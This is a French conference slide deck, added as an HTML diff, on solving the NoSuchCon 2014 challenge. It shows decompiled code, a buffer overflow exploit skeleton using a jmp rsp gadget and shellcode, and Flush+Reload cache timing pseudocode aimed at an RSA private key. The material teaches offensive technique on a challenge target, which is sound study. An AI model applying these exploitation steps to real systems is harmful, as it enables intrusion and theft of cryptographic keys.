@@ -1,0 +1,1290 @@
+<!doctype html>
+<html lang="fr">
+    <head>
+        <meta charset="utf-8">
+
+        <title>ATTACK THE CACHE TO GET SOME CASH</title>
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+        <link rel="stylesheet" href="./reveal.js/css/reveal.css">
+        <link rel="stylesheet" href="./reveal.js/css/theme/beige.css" id="theme">
+        <link rel="stylesheet" href="./reveal.js/lib/css/zenburn.css">
+        <script src="./js/jquery-1.11.2.min.js"></script>
+        <style type="text/css">
+        body {
+            background-image: url(./images/grid_masked_dark.png);
+            background-image: url(./images/grid_masked_dark.png);
+            background-attachment: fixed;
+            background-position: center; 
+        }
+        .reveal section img {
+            background: none;
+            border: none;
+            text-decoration: none;
+            box-shadow: none;
+            vertical-align: middle;
+        }
+        svg {
+            background-color: none;
+        }
+        .schema div {
+            width: 100%;
+            text-align: center;
+            vertical-align: center;
+        }
+        .schema span {
+            border: 10px solid grey;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 10px;
+            padding: 0px;
+        }
+        .schema .col1 {
+            width: 88%;
+        }
+        .schema .col2 {
+            width: 42.6%;
+        }
+        .schema .col4 {
+            width: 20%;
+        }
+        .todo {
+            font-weight: bold;
+            background-color: yellow;
+            color: red;
+        }
+        .backn {
+            color: #866;
+        }
+        .colormessage {
+            color: green;
+            font-family: monospace;
+        }
+        .colorkey {
+            color: red;
+            font-family: monospace;
+        }
+        .coloraes {
+            color: blue;
+            font-family: monospace;
+        }
+        </style>
+    </head>
+    <body>
+
+        <div class="reveal">
+
+            <div class="slides">
+                <section>
+                    <h2>ATTACK THE CACHE TO GET SOME CASH</h2>
+                    <p>Sthack 27 mars 2015</p>
+                    <img data-src="./images/sthack.png" width="30%" />
+                    <aside class="notes">
+                    coucou
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>David BERARD &amp; Vincent FARGUES</h3>
+                    <p>CESTI Thales &agrave; Toulouse</p>
+                    <img data-src="./images/logo-thales.png" width="40%" />
+                </section>
+
+                <section>
+                    <h3>Challenge NoSuchCon #2 - septembre 2014</h3>
+                    <img data-src="./images/nsc-logo.png" width="20%" />
+                    <br clear="all" />
+                    <ul>
+                    <li>Conférence à Paris 19-21 Novembre</li>
+                    <li>Challenge créé par <img data-src="./images/synacktiv-logo.png" width="20%" /></li>
+                    <li>Objectif : Trouver email + password</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Challenge en 3 étapes</h3>
+                    <ol>
+                    <li>Rétro ingénierie MIPS</li>
+                    <ul class="fragment">
+                        <li>Rétro ingénierie rapide et analyse statistique</li>
+                    </ul>
+                    <li class="fragment">Escape Python sandbox + XXE</li>
+                    <ul class="fragment">
+                        <li>Attaque sur AES-128 avec un padding oracle (vulnérabilité non souhaitée par les créateurs).</li>
+                        <li>Exfiltration de données par XXE</li>
+                        <li>Evasion de la sandbox Pickle modifiée</li>
+                    </ul>
+                    <li class="fragment" style="color: red">Timing cache attack sur RSA en remote avec overflow</li>
+                    <ul class="fragment">
+                        <li>Exploitation d'un buffer overflow</li>
+                        <li>Réalisation d'une attaque par canaux auxiliaires</li>
+                    </ul>
+                    </ol>
+                </section>
+
+                <section>
+                    <h3>Découverte de l'archive</h3>
+                    <pre><code data-trim class="nohighlight">$ tar xzvf securedrop.tar.gz 
+securedrop/
+securedrop/client/
+securedrop/client/client.py
+securedrop/archive/
+securedrop/archive/messages
+securedrop/servers/
+securedrop/servers/SecDrop
+securedrop/servers/xinetd.conf/
+securedrop/servers/xinetd.conf/secdrop
+securedrop/servers/xinetd.conf/stpm
+securedrop/servers/STPM
+securedrop/lib/
+securedrop/lib/libsec.so</code></pre>
+                </section>
+
+                <section>
+                    <h3>Découverte de l'archive : message archivé</h3>
+                    <pre><code data-trim class="nohighlight">
+securedrop/archive/messages</span>
+</code></pre>
+<pre><code data-trim class="nohighlight">
+$ cat archive/messages 
+new message:
+0C849AFE0A7C11B2F083C32E7FDB0F8AC03198D84D9990B26D6443B1D185A36A235A561
+BB99FE897858371311B2AD6DFE75E199667637EDEA7B9C14A158A5F6FFE15A1C14DAD80
+8FDC9F846530EDD4FE3E86F4F98571CD45F11190ED531FC940D62C2C2E05F9977223580
+8097763157F140FE4A57DB6AD902D9962F12BDFC1547CED3E282604255B2A5331373CAE
+E557CC825DD6A03C3D2D7B106E4AD15347BCB5067BDC60376FF1CC133F2C14
+9d41dbb8da10b66cdde844f62e9cc4f96c3a88730b7b8307810cf1906935123f97ac9b6
+82dd401512d18775bd7bd9b8b40929f5b4a1871ba44c94038793f0aa639b9d71d72d2ac
+cfcc95671c77a5c1c32bc813b048f5dcb1f08b59d6a7afb3b34462ac6abb69cb70accb2
+4d78389a1777c5244b8063c542cc1f6c6db8d41d32df2e7132e21db8a1cc711c1a97c51
+ba29f1d1ac8fa901a902b2a987f0764734f8b8cd2d476200e7ae62a424e2930d8b02940
+9d0e5e13d4e11f4b5f5cc1263f41b500b4340b8641465bbc56c64a575f0ee215d02dea3
+d75552328cf5742c
+</code></pre>
+<p>Message chiffré (2 lignes)</p>
+                </section>
+                <section>
+                    <h3>Découverte de l'archive : client python</h3>
+                    <pre><code data-trim class="nohighlight">
+securedrop/client/client.py
+                    </code></pre>
+
+                    <pre><code data-trim class="python">
+[...]
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(15)
+s.connect(('nsc2014.synacktiv.com', 1337))
+
+s.send('%s\n%s\n%s\n'%(PASSWORD, wk, enc.encode('hex')))
+r = ''
+while '\n' not in r :
+    r += s.recv(1024)
+
+try :
+    r = r.strip('\n').decode('hex')
+    print ocb_decrypt(k, r)
+except :
+    print r
+                    </code></pre>
+                    <aside class="notes">
+                    - Client python inclue lib
+                    - chiffrement aes et RSA
+                    - Clef pub rsa en dur
+                    - Clef AES Random
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Découverte de l'archive : configuration xinetd</h3>
+                    <pre><code data-trim class="nohighlight">
+securedrop/servers/xinetd.conf/secdrop
+securedrop/servers/xinetd.conf/stpm
+                    </code></pre>
+                    <ul>
+                        <li class="fragment">secdrop
+                            <ul>
+                                <li>port : 1337</li>
+                                <li>utilisateur : secdrop</li>
+                                <li>binaire : /home/secdrop/SecDrop</li>
+                                <li>argument : /home/secdrop/messages</li>
+                            </ul>
+                        </li>
+                        <li class="fragment">stpm
+                            <ul>
+                                <li>port : 2014</li>
+                                <li>utilisateur : stpm</li>
+                                <li>binaire : /home/stpm/STPM</li>
+                                <li>argument : /home/stpm/keyfile</li>
+                            </ul>
+                        </li>
+                    </ul>
+                <aside class="notes">
+                    1337 : wan
+                    2014 : local only
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Découverte de l'archive : Binaires x86-64</h3>
+                    <pre><code data-trim class="nohighlight">
+securedrop/servers/SecDrop
+securedrop/servers/STPM
+securedrop/lib/libsec.so
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Fonctionnement basique du client</h3>
+                    <pre class="mscgen_js" style="text-align: center; border: none; box-shadow: none; margin-left: 180px;">
+msc {
+    a [label="Client",textbgcolor="#CCC",textcolor="black"],
+    b [label="SecDrop",textbgcolor="#CCC",textcolor="black"];
+  
+    a =>> a [label="gen random AES_key"];
+    a =>> b [label="PASSWORD"];
+    a =>> b [label="RSA_encrypt(AES_key,Kpub)"];
+    a =>> b [label="AES_encrypt(message,AES_key)"];
+    b =>> a [label="AES_encrypt(\"OK\",AES_key)"];
+}
+</pre>
+                <aside class="notes">
+                    Expliquer que schéma comm réseau + montrer
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Rétro ingénierie SecDrop</h3>
+                    <ul>
+                        <li>&Eacute;coute via xinetd sur le port 1337</li>
+                        <li>Service de réception de message</li>
+                        <li>Stockage de messages dans un fichier (<code>argv[1]</code>)</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Rétro ingénierie SecDrop : initialisation</h3>
+                    <ul>
+                        <li>fopen <code>argv[1]</code></li>
+                        <li>Connect <code>127.0.0.1:2014</code></li>
+                        <li>Limitation des syscalls à <code>READ</code>, <code>WRITE</code>, <code>EXIT</code></li>
+                    </ul>
+                    <pre><code data-trim class="c">
+LODWORD(v0) = seccomp_init(0LL);
+v1 = v0;
+if ( v0
+    && seccomp_rule_add(v0, 2147418112LL, 0LL, 1LL) >= 0
+    && seccomp_rule_add(v1, 2147418112LL, 0LL, 1LL) >= 0
+    && seccomp_rule_add(v1, 2147418112LL, 1LL, 1LL) >= 0
+    && seccomp_rule_add(v1, 2147418112LL, 1LL, 1LL) >= 0
+    && seccomp_rule_add(v1, 2147418112LL, 1LL, 1LL) >= 0
+    && seccomp_rule_add(v1, 2147418112LL, 1LL, 1LL) >= 0
+    && seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL) >= 0
+    && seccomp_load(v1) >= 0 )
+{
+    seccomp_release(v1);
+    result = 0LL;
+}                   
+                    </code></pre>
+                     <aside class="notes">
+                    0 = read
+                    1 = write
+                    60 = exit
+                    importance plus tard
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Rétro ingénierie SecDrop : lecture du password</h3>
+                    <ul>
+                        <li>Mot de passe fixe hardcodé</li>
+                    </ul>
+                    <pre><code data-trim class="c">
+if ( read(0, &buf, 0x21uLL) != 33 || 
+    memcmp(&buf, "UBNtYTbYKWBeo12cHr33GHREdZYyOHMZ\n", 0x21uLL) )
+{
+  write(1, "WRONG PASSWORD!\n", 0x10uLL);
+  SEC_exit(1LL);
+}
+sub_400FB0(v7);
+SEC_exit(0LL);
+                    </code></pre>
+                <aside class="notes">
+                Mot de passe fourni dans le client py
+                </aside>
+                </section>
+
+                <section>
+                    <h3>Rétro ingénierie SecDrop</h3>
+                    <h4>Lecture de la clef AES chiffrée par RSA et du message chiffré par AES</h4>
+                    <ul>
+                        <li>Lecture caractère par caractère</li>
+                        <li>Stockage sur la stack</li>
+                    </ul>
+                    <pre><code data-trim class="c">
+int __fastcall read_input(__int64 a1, __int64 a2)
+{
+  v2 = 0LL;
+  while ( 1 )
+  {
+    result = SEC_fgetc(a1);
+    if ( result == -1 || result == '\n' )
+      break;
+    v3 = (unsigned int)v2;
+    v2 = (unsigned int)(v2 + 1);
+    *(_BYTE *)(a2 + v3) = result;
+  }
+  *(_BYTE *)(a2 + v2) = 0;
+  return result;
+}
+                    </code></pre>
+                <aside class="notes">
+                Fin de boucle == "\n" --> important plus tard
+                </aside>
+                </section>
+
+                <section>
+                    <h3>Rétro ingénierie SecDrop : communication avec STPM</h3>
+                    <ul>
+                        <li class="fragment">Clef AES chiffrée par RSA envoyée au STPM
+                        <ul>
+                            <li>Avec la commande : <code>3<span class="backn">\n</span>2<span class="backn">\n</span>0<span class="backn">\n</span>KEY<span class="backn">\n</span></code></li>
+                        </ul>
+                        </li>
+                        <li class="fragment">Message chiffré AES transmis au STPM
+                        <ul>
+                            <li>Avec la commande : <code>2<span class="backn">\n</span>2<span class="backn">\n</span>MESSAGE<span class="backn">\n</span></code></li>
+                        </ul>
+                        </li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Fonctionnement global</h3>
+                    <pre class="mscgen_js" style="text-align: center; border: none; box-shadow: none;">
+msc {
+    wordwraparcs=true;
+    a [label="Client",textbgcolor="#CCC",textcolor="black"],
+    b [label="SecDrop",textbgcolor="#CCC",textcolor="black"],
+    c [label="STPM",textbgcolor="#CCC",textcolor="black"];
+  
+    a -> a [label="AES_key=random(16)"];
+    a =>> b [label="PASSWORD"];
+    a =>> b [label="RSA_encrypt(AES_key,Kpub)"],
+    b =>> c [label="3-2-0-RSA_encrypted_AES_key"];
+    a =>> b [label="AES_encrypt(message,AES_key)"],
+    b =>> c [label="2-2-AES_encrypted_message"];
+}
+                    </pre>
+                <aside class="notes">
+                    Envoyé sur la socket ouverte vers 2014
+                </aside>
+                </section>
+
+                <section>
+                    <h3>Pseudo-Code SecDrop</h3>
+
+                    <pre><code data-trim class="c">
+
+save_messages = open(argv[1])
+
+socket_stpm = connect(localhost:2014)
+
+restrict_allowed_syscalls()
+
+passwd = read(stdin,33)
+
+if(passwd=="UBNtYTbYKWBeo12cHr33GHREdZYyOHMZ\n"):
+    aes_key =read_input()
+    encrypted_msg=read_input()
+
+    send(socket_stpm,"3\n2\n0\n"+aes_key+"\n")
+    send(socket_stpm,"2\n2\n"+encrypted_msg+"\n")
+
+    save_messages.write(aes_key + "\n" + encrypted_msg)
+
+                        </code></pre>
+                   
+
+
+                </section>
+
+
+
+                <section>
+                    <h3>Rétro ingénierie STPM</h3>
+                    <ul>
+                        <li class="fragment">&Eacute;coute via xinetd sur le port 2014 (filtré pour l'extérieur)</li>
+                        <li class="fragment">Sofware Trusted Platform Module ?</li>
+                        <li class="fragment">Réalise les opérations de chiffrement et de déchiffrement</li>
+                        <li class="fragment">Stocke des clefs (16 emplacements pour des clefs symétriques / asymétriques)</li>
+                        <li style="color: red" class="fragment">Préchargement des clefs depuis le fichier <code>argv[1]</code>
+                            <ul>
+                                <li>Absent de l'archive fournie</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </section> 
+
+                <section>
+                    <h3>Rétro ingénierie STPM : parsing des commandes</h3>
+                    <ul>
+                        <li>Symboles présents dans le binaire :)</li>
+                    </ul>
+                    <pre><code data-trim class="c">
+switch ( v2 ) {
+    case '4':
+      v3 = export_key();
+      goto LABEL_6;
+    case '3':
+      v3 = import_key();
+      goto LABEL_6;
+    case '2':
+      v3 = message_decrypt();
+    LABEL_6:
+      if ( v3 )
+        goto LABEL_7;
+      continue;
+    case '1':
+      print_keys();
+[...]
+                    </code></pre>
+                <aside class="notes">
+                Correspond aux commandes envoyées sur la socket
+                </aside>
+                </section> 
+
+                <section>
+                    <h3>Rétro ingénierie STPM : commandes disponibles</h3>
+                    <ol>
+
+                        <li class="fragment"><code>print_keys()</code><br />affiche toutes les clefs stockées</li>
+                        <li class="fragment">
+                            <code>decrypt(<span class="colorkey">key_id</span>,<span class="colormessage">message</span>)</code><br />
+                            déchiffre le <span class="colormessage">message</span> avec la clef <span class="colorkey">key_id</span></li>
+                        <li class="fragment">
+                            <code>import_key(<span class="colorkey">key_id</span>,<span class="colormessage">index</span>,<span class="coloraes">ciphered_AES_key</span>)</code><br />
+                            Reçoit <span class="coloraes">ciphered_AES_key</span> chiffré en RSA avec la clef <span class="colorkey">key_id</span><br />
+                            Déchiffre et stocke la clef à l'<span class="colormessage">index</span> spécifié
+                        </li>
+                        <li class="fragment">
+                            <code>export_key(<span class="colormessage">index</span>,<span class="colorkey">key</span>)</code><br />
+                            Renvoie la clef AES à l’<span class="colormessage">index</span> spécifié chiffrée en RSA avec la clef <span class="colorkey">key</span>
+                        </li>
+                        <li class="fragment"><code>exit()</code></li>
+
+                    </ol>
+                </section> 
+
+                <section>
+                    <h3>Fonctionnement global</h3>
+                    <pre class="mscgen_js" style="text-align: center; border: none; box-shadow: none;">
+msc {
+    wordwraparcs=true;
+    a [label="Client",textbgcolor="#CCC",textcolor="black"],
+    b [label="SecDrop",textbgcolor="#CCC",textcolor="black"],
+    c [label="STPM",textbgcolor="#CCC",textcolor="black"];
+  
+    a -> a [label="AES_key=random(16)"];
+    c -> c [label="Kpriv=read(argv[1])"],
+    a =>> b [label="PASSWORD"];
+    a =>> b [label="RSA_encrypt(AES_key,Kpub)"],
+    b =>> c [label="3-2-0-RSA_encrypted_AES_key"];
+    c -> c [label="AES_key=RSA_decrypt(Kpriv)"];
+    c -> c [label="store(AES_key)"];
+    c =>> b [label=""];
+    a =>> b [label="AES_encrypt(message,AES_key)"],
+    b =>> c [label="2-2-AES_encrypted_message"];
+    c =>> b [label="AES_encrypt(\"OK\",AES_key)"],
+    b =>> a [label="AES_encrypt(\"OK\",AES_key)"];
+}
+                    </pre>
+                </section>
+
+                <section>
+                    <h3>Buffer Overflow dans SecDrop</h3>
+                    <ul>
+                        <li>Lecture caractère par caractère sur la socket vers le client</li>
+                        <li>Stockage sur la stack</li>
+                        <li>Arrêt de la lecture si retour à la ligne &rarr; overflow </li>
+                    </ul>
+                    <pre><code data-trim class="c">
+int __fastcall read_input(__int64 a1, __int64 a2)
+{
+  v2 = 0LL;
+  while ( 1 )
+  {
+    result = SEC_fgetc(a1);
+    if ( result == -1 || result == '\n' )
+      break;
+    v3 = (unsigned int)v2;
+    v2 = (unsigned int)(v2 + 1);
+    *(_BYTE *)(a2 + v3) = result;
+  }
+  *(_BYTE *)(a2 + v2) = 0;
+  return result;
+}
+                    </code></pre>
+                <aside class="notes">
+                Fonction de lecture sur la socket
+                </aside>
+                </section>
+
+
+                <section>
+                    <h3>Buffer Overflow dans SecDrop</h3>
+                    <pre class="mscgen_js" style="text-align: center; border: none; box-shadow: none; margin-left: 180px;">
+msc {
+    a [label="Client",textbgcolor="#CCC",textcolor="black"],
+    b [label="SecDrop",textbgcolor="#CCC",textcolor="black"];
+  
+    a =>> b [label="PASSWORD"];
+    a =>> b [label="padding+ ROP Chain + Shellcode"];
+    ...;
+}
+</pre>
+<div class="fragment" style="border: 2px solid red; margin: auto; width: 50px; font-size: 10px; font-weight: bold; background-color: yellow; position: absolute; top: 74%; left: 64.5%;">shellcode execution</div>
+                </section>
+
+                <section>
+                    <h3>Buffer Overflow dans SecDrop : shellcode</h3>
+                    <ul>
+                        <li>ROP chain simple : gadget magique présent dans le code
+                            <pre><code data-trim class="nohighlight">
+.text:0000000000400F60                 db 0B8h
+.text:0000000000400F61 ; -----------------------------
+.text:0000000000400F61                 jmp     rsp
+.text:0000000000400F61 ; -----------------------------
+.text:0000000000400F63                 db    0
+                            </code></pre>
+                        </li>
+                        <li>Exploit :
+                            <pre><code data-trim class="python">
+jmp_rsp=0x00400f61
+# password
+payload="UBNtYTbYKWBeo12cHr33GHREdZYyOHMZ\n"
+# overflow
+payload+="A"*12072
+# Jump to shellcode
+payload+=addr(jmp_rsp)
+# write shellcode
+payload+=shellcode()
+payload+="\n"
+                            </code></pre>
+                        <li>Syscalls limités à <code>READ</code>, <code>WRITE</code>, <code>EXIT</code> par la sandbox</li>
+                    </ul>
+                <aside class="notes">
+                Merci pour le gadget vu que le but c'était pas vraiment de ROP ou de bf une adresse de retour en remote
+
+                Pas possible de shellcode : que pourrait on faire ?
+                </aside>
+                </section>
+
+                <section>
+                    <h3>Buffer Overflow dans SecDrop : exemple avec printKey</h3>
+                    <ul>
+                        <li>Réutilisation des descripteurs de fichier déjà ouverts (sockets client/STPM)</li>
+                    </ul>
+                    <pre class="mscgen_js" style="text-align: center; border: none; box-shadow: none;">
+msc {
+    wordwraparcs=true;
+    a [label="Client",textbgcolor="#CCC",textcolor="black"],
+    b [label="SecDrop",textbgcolor="#CCC",textcolor="black"],
+    c [label="STPM",textbgcolor="#CCC",textcolor="black"];
+  
+    a =>> b [label="PASSWORD"];
+    a =>> b [label="padding+ ROP Chain + Shellcode"];
+    b =>> c [label="1 (printKey)"];
+    c =>> b [label="printKey results"];
+    b =>> a [label="printKey results"];
+}
+                    </pre>
+                    <div class="toto" style="border: 2px solid red; margin: auto; width: 120px; font-size: 12px; font-weight: bold; background-color: yellow; position: absolute; top: 77%; left: 36.2%; transform: rotate(90deg);">shellcode execution</div>
+                </section>
+
+                <section>
+                    <h3>Buffer Overflow dans SecDrop : exemple avec printKey</h3>
+                            <pre><code data-trim class="nohighlight">
+key 0: ASYMETRIC
+    n = 0x000000B740DF8EE7BEFFE41A337B4E56FFE903D6D62C75[...] 
+    e = 0x00010001
+    q = PRIVATE :)
+key 1: SYMETRIC
+    k = SECRET :)
+key 2: EMPTY
+key 3: EMPTY
+key 4: EMPTY
+key 5: EMPTY
+key 6: EMPTY
+key 7: EMPTY
+key 8: EMPTY
+key 9: EMPTY
+key 10: EMPTY
+key 11: EMPTY
+key 12: EMPTY
+                            </code></pre>
+                </section>
+
+                <section>
+                <img data-src="./images/tweet.png" />
+                <aside class="notes">
+                Tweet publié avant qu'on arrive là
+                </aside>
+                </section>
+
+                <section>
+                    <h3>Timing Cache attack</h3>
+                    <ul>
+                        <li>Attaque par canaux auxiliaires utilisant le cache des processeurs x86</li>
+                        <li>Cible les algorithmes cryptographiques</li>
+                        <ul>
+                            <li>AES</li>
+                            <li>RSA</li>
+                        </ul>
+                        <div class="fragment">
+                        <img style="float: right;" data-src="./images/flushandreload.png" width="30%" />
+                        <li>FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack</li>
+                        source : <a href="https://eprint.iacr.org/2013/448.pdf">https://eprint.iacr.org/2013/448.pdf</a>
+                        </div>
+                    </ul>
+                <aside class="notes">
+                infos sur les caches attack
+                1 - tentative cibler AES mais échec
+                2 - RSA avec bon papier
+                </aside>
+                </section>
+
+                <section>
+                    <h3>Flush+Reload : conditions d'exploitation</h3>
+                    <ul>
+                        <li>L'attaquant et la cible doivent être sur le même processeur</li>
+                        <div class="fragment">
+                        <ul>
+                            <li style="color: green;">Shellcode dans SecDrop sur la même machine que STPM</li>
+                        </ul>
+                        <br />
+                        </div>
+                        <li>Le code du RSA doit être lisible par l'attaquant</li>
+                        <div class="fragment">
+                        <ul>
+                            <li style="color: green;">Opérations RSA réalisées dans la librairie partagée</li>
+                        </ul>
+                    </ul>
+                <aside class="notes">
+                bilan == Conditions OK
+                </aside>
+                </section>
+
+                <section data-transition="none">
+                    <h3>Flush+Reload : Le cache comme canal auxiliaire</h3>
+                    <img data-src="./images/caches0.svg" />
+                    <aside class="notes">
+                Décrire chaque coeur = L1 + L2 
+                L3 partagé
+                Mémoire principale
+                </aside>
+                </section>
+
+                <section data-transition="none">
+                    <h3>Flush+Reload : Le cache comme canal auxiliaire</h3>
+                    <img data-src="./images/caches1.svg" />
+                <aside class="notes">
+                possible de faire axe vertical = temps d'accès
+                </aside>
+                </section>
+
+                <section data-transition="none">
+                    <h3>Flush+Reload : Le cache comme canal auxiliaire</h3>
+                    <div class="fragment">
+                        <div style="border: 3px solid black; background-color: white; position: absolute; width: 100px; font-size: 14px; top: 18%; left: 60.5%;">&lt; X cycles CPU</div>
+                        <div style="border: 3px solid black; background-color: white; position: absolute; width: 100px; font-size: 14px; top: 18%; left: 29.5%;">&gt; X cycles CPU</div>
+                    </div>
+                    <img data-src="./images/caches2.svg" />
+                </section>
+
+                <section data-transition="none">
+                    <h3>Flush+Reload : Le cache comme canal auxiliaire</h3>
+                    <img data-src="./images/caches3.svg" />
+                </section>
+
+                <section>
+                    <h3>Flush+Reload : Algorithme</h3>
+                    <pre><code data-trim class="python">
+while True:
+    a = get_CPU_cycle()
+    read_memory(address)
+    b = get_CPU_cycle()
+    flush_caches(address)
+
+    if b-a < threshold:
+        # the memory zone was accessed by another process
+    else:
+        # the memory zone wasn't accessed
+                    </code></pre>
+                <aside class="notes">
+                Résumé dans du pseudo code : 
+                On va être capable de monitorer le fait qu'on est passé par un endroit dans le code
+                </aside>
+                </section>
+
+                <section>
+                    <h3>Identification des seuils</h3>
+                    <ul>
+                        <li>FLUSH+Reload sur une adresse régulièrement utilisée</li>
+                        <li>Récupération du nombre de cycles CPU pour une lecture</li>
+                    </ul>
+                    <script type="text/javascript">
+                    $(document).ready(function () {
+                        var chart = new CanvasJS.Chart("chartContainerSeuils",
+                        {
+                            zoomEnabled: true,
+                            animationEnabled: false,
+                            backgroundColor: "rgba(255, 255, 255, 0.3)",
+                            height: 300,
+                            width: 800,
+                            axisX: {
+                                title:"Nombre de cycles CPU",
+                                minimum: 100,
+                                maximum: 680,
+                                labelFontSize: 14,
+                                titleFontSize: 18                            
+                            },
+                            axisY:{
+                                title: "Nombre de hits",
+                                lineThickness: 2,
+                                labelFontSize: 14,
+                                titleFontSize: 18,
+                                maximum: 8000,
+                                minimum: 0,
+                            },
+                            data: [{        
+                                type: "column",  
+                                dataPoints: [
+                                    { x: 120, y: 4203 },
+                                    { x: 130, y: 2003 },
+                                    { x: 140, y: 1470 },
+                                    { x: 240, y: 1965 },
+                                    { x: 260, y: 7077 },
+                                    { x: 280, y: 249 },
+                                    { x: 300, y: 39 },
+                                    { x: 320, y: 240 },
+                                    { x: 440, y: 1 },
+                                    { x: 500, y: 1 },
+                                    { x: 600, y: 2 },
+                                    { x: 640, y: 1 },
+                                    { x: 680, y: 1 },
+                                ]
+                            }]
+                        });
+                        chart.render();
+                    });
+                    </script>
+                    <div style="margin: auto; clear: all; height: 300px; width: 800px; border: 1px solid black;">
+                        <div id="chartContainerSeuils" style="text-align: center;">&nbsp;</div>
+                        <div style="color: white; text-shadow: 1px 1px #000; background-color: green; opacity: 0.5; position: absolute; top: 40%; left: 15.5%; width: 124px; height: 228px;" class="fragment">
+                            Cache HITS<br />&lt; 200
+                        </div>
+                        <div style="color: white; text-shadow: 1px 1px #000; background-color: red; opacity: 0.5; position: absolute; top: 40%; left: 28.4%; width: 600px; height: 228px;" class="fragment">
+                            Cache<br >MISS<br />&gt; 200
+                        </div>
+                    </div>
+                <aside class="notes">
+                Commenter les axes
+                Axe horizontal --> Nombre de cycles CPU pour accès
+                Axe vertical --> nombre de fois que ce nombre est arrivé
+                </aside>
+                </section>
+
+
+                <section>
+                    <h3>RSA : Exponentiation modulaire</h3>
+                    <ul>
+                        <li>RSA_decrypt : bigint(ciphertext) ^ d % n</li>
+                        <ul>
+                            <li>d => exposant privé</li>
+                            <li>n => modulus</li>
+                        </ul>
+                        <li>Bignum Exp_mod : square et multiply</li>
+                    </ul>
+                    <pre><code data-trim class="c">
+/* base = n, exp = d, m = int(ciphertext) */
+modpow(base, exp, m) {
+    result = 1;
+    while (exp > 0) {
+        if (exp & 1 > 0) {
+            result = (result * base) % m; #MULTIPLY
+        }
+        exp >>= 1;
+        base = (base * base) % m; #SQUARE
+    }
+    return result;
+}
+                    </code></pre>
+                    <aside class="notes">
+                    Code particulier pour exponent sur un bignum
+                </aside>
+                    <div class="fragment" data-fragment-index="1" style="border: 5px solid red; margin: auto; width: 250px; position: absolute; top: 63%; left: 13%; height: 24px;">&nbsp;</div>
+
+                </section>
+
+                <section>
+                    <h3>Identification des fonctions Square & Multiply</h3>
+                    <ul>
+                        <li class="fragment" data-fragment-index="1">Test sur le bit</li>
+                        <li class="fragment" data-fragment-index="2">Square & multiply</li>
+                    </ul>
+                    <img data-src="./images/square_multiply.png" />
+                    <div class="fragment" data-fragment-index="1" style="border: 5px solid red; margin: auto; width: 370px; position: absolute; top: 39%; left: 29%;">&nbsp;</div>
+                    <div class="fragment" data-fragment-index="2" style="border: 5px solid red; margin: auto; width: 395px; position: absolute; top: 58%; left: 48%; height: 20px;">&nbsp;</div>
+                    <div class="fragment" data-fragment-index="2" style="border: 5px solid red; margin: auto; width: 320px; position: absolute; top: 85.5%; left: 51%; height: 20px;">&nbsp;</div>
+                </section>
+
+                <section data-transition="none">
+                    <h3>Cache attack depuis l'overflow dans SecDrop</h3>
+                    <img data-src="./images/cache_attack_memory.svg" />
+
+                    <aside class="notes">
+                    <ul>
+                    	<li>Deux processus utilisent la meme lib</li>
+                    	<li>SecDrop l'utilise pour lire les données</li>
+                    	<li>stpm pour les opérations crypto</li>
+                    </ul>
+                    </aside>
+                </section>
+
+                <section data-transition="none">
+                    <h3>Cache attack depuis l'overflow dans SecDrop</h3>
+                    <img data-src="./images/cache_attack_memory_shellcode.svg" />
+                    <aside class="notes">
+                    <ul>
+                    	<li>Developpement d'un shellcode pour jouer la cache attack</li>
+                    	<li>En assembleur c'est plus simple (généré depuis python)</li>
+                    	<li>Réalise les mesures sur le cache, transfert les données sur la socket client</li>
+                    </ul>
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Cache attack depuis l'overflow dans SecDrop</h3>
+                    <pre class="mscgen_js" style="text-align: center; border: none; box-shadow: none;">
+msc {
+    wordwraparcs=true;
+    a [label="Client",textbgcolor="#CCC",textcolor="black"],
+    b [label="SecDrop",textbgcolor="#CCC",textcolor="black"],
+    c [label="STPM",textbgcolor="#CCC",textcolor="black"];
+  
+    a =>> b [label="PASSWORD"];
+    a =>> b [label="padding+ ROP Chain + Shellcode"];
+    b =>> c [label="3-2-0-RSA_encrypted_AES_key"];
+    c -> c [label="AES_key=RSA_decrypt(Kpriv)"];
+    b =>> a [label="results"];
+}
+                    </pre>
+                    <div class="toto" style="border: 2px solid red; margin: auto; width: 120px; font-size: 12px; font-weight: bold; background-color: yellow; position: absolute; top: 70%; left: 36.2%; transform: rotate(90deg);">shellcode execution</div>
+                    <div class="fragment">
+                        <div style="border: 2px solid red; margin: auto; width: 60px; font-size: 12px; font-weight: bold; background-color: yellow; position: absolute; top: 73%; left: 41.3%; transform: rotate(90deg);">mesures</div>
+                        <div style="border: 3px solid red; margin: auto; width: 270px; position: absolute; top: 67%; left: 76%;">&nbsp;</div>
+                    </div>
+                    <aside class="notes">
+                    <ul>
+                    	<li>D'un point de vue temporel</li>
+                    	<li>Envoie de la clé chiffré au STPM</li>
+                    	<li>Directement après cache_attack sur le square et multiply</li>
+                    	<li style="color: red;">Click</li>
+                    	<li>Apres avoir fait un nombre de mesure donnée</li>
+                    	<li>Envoie des données au client</li>
+                    </ul>
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Résultats</h3>
+                    <script type="text/javascript">
+                    $(document).ready(function () {
+                        var chart = new CanvasJS.Chart("chartContainer",
+                        {
+                            zoomEnabled: true,
+                            panEnabled: true,
+                            showInLegend: true,
+                            backgroundColor: "rgba(255, 255, 255, 0.3)",
+                            height: 300,
+                            width: 800,
+                            title:{
+                                text: "Hits"
+                            },
+                            legend: {
+                                horizontalAlign: "right",
+                                verticalAlign: "center"
+                            },
+                            axisX:{
+                                title: "Mesures",
+                            },
+                            axisY:{
+                                interval:1,
+                                valueFormatString: " ",
+                            },
+                            toolTip:{
+                                enabled: false
+                            },
